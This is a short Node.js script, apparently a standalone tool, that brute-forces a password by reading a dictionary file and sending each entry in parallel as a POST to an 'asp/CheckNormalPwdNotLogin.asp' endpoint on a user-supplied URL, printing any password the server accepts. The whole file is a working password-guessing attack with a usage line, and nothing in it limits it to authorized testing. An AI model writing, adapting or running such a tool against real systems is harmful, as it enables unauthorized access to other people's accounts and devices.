(async()=>{
    "use strict";

    // Dependencies
    const { runJobs } = require("parallel-park")
    const request = require("request-async")
    const fs = require("fs")

    // Variables
    const args = process.argv.slice(2)

    // Main
    if(!args.length) return console.log("usage: node index.js <url> <dictionary>")
    if(!fs.existsSync(args[1])) return console.log("Invalid dictionary.")

    const passwords = fs.readFileSync(args[1], "utf8").replace(/\r/g, "").split("\n")

    var password = await runJobs(
        passwords,
        async(password, index, max)=>{
            var response = await request.post(`${args[0]}asp/CheckNormalPwdNotLogin.asp?&1=1`, {
                headers: {
                    "content-type": "application/x-www-form-urlencoded"
                },
                body: `NormalPwdInfo=${password}`
            })

            response = response.body

            if(response == "1") return password
        }
    )

    password = password.filter((password) => password)

    password[0] ? console.log(`Valid password found. ${password}`) : console.log("No valid password found.")
})()